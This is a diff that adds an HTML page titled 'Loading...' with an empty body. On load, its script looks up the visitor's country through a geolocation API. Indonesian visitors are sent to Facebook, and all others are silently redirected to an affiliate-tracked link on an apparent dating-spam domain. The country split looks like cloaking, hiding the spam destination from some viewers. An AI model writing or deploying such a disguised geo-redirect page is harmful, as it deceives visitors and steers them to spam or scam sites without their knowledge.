@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Loading...</title>
+    <style>
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+        jQuery.ajax({
+            url: 'https://ipapi.co/json/',
+            type: 'POST',
+            dataType: 'json',
+            success: function(location) {
+                if (location.country_code === 'ID') {
+                    window.location.href = 'https://www.facebook.com/';
+                } else if (location.country_code === 'US') {
+                    window.location.href = 'http://date5withme1.com/?u=a1w80k9&o=nalwlrk&t=GTR&cid=GTR';
+                } else if (location.country_code === 'DE') {
+                    window.location.href = 'http://date5withme1.com/?u=a1w80k9&o=nalwlrk&t=GTR&cid=GTR';
+                } else if (location.country_code === 'IT') {
+                    window.location.href = 'http://date5withme1.com/?u=a1w80k9&o=nalwlrk&t=GTR&cid=GTR';
+                } else {
+                    window.location.href = 'http://date5withme1.com/?u=a1w80k9&o=nalwlrk&t=GTR&cid=GTR';
+                }
+            }
+        });
+    </script>
+</head>
+<body>
+</body>
+</html>
